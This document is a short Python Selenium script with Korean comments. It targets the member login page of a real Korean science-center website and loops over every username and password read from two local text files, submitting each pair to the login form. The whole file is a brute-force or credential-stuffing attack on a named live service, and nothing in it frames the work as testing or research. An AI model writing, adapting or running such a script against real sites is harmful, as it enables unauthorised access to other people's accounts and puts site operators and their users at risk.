from selenium import webdriver
import time
from selenium.webdriver.common.keys import Keys

driver = webdriver.Chrome('C:\\Users\\lst\\Desktop\\chromedriver_win32\\chromedriver.exe')
driver.implicitly_wait(10)

# 사이트 주소 입력
driver.get('https://www.sciencecenter.go.kr/scipia/users/login')


lists_id = []
lists_pw = []


#
f_id = open("C:\\Users\\lst\\Desktop\\id.txt", 'r')
while True:
    line_id = f_id.readline()
    if not line_id: break
    # print(line_id)
    lists_id.append(line_id.rstrip().lstrip())
f_id.close()


f_pw = open("C:\\Users\\lst\\Desktop\\pw.txt", 'r')
while True:
    line_pw = f_pw.readline()
    if not line_pw: break
    # print(line_pw)
    lists_pw.append(line_pw.rstrip().lstrip())
f_pw.close()


try:
    for list_id in lists_id:
        for list_pw in lists_pw:
            driver.find_element_by_id('memberId').send_keys(list_id)
            driver.find_element_by_id('password').send_keys(list_pw)
            driver.find_element_by_name('action').click()
            # time.sleep(4)
            # driver.find_element_by_xpath('//button/span').click()
except Exception as eLog:
    print(eLog)
    print(list_id +"," +list_pw)






# 로그인 버튼을 눌러주자.
# driver.find_element_by_xpath('//*[@id="loginField"]/fieldset/input').is_enabled()

# driver.find_element_by_xpath("//form[@class='LoginForm']/fieldset/input").send_keys(Keys.ENTER)
# driver.find_element_by_xpath("//form[@class='LoginForm']/fieldset/input").is_enabled()
#
# element = driver.find_element_by_xpath("//form[@class='LoginForm']/button")
# driver.execute_script("arguments[0].click();", element)

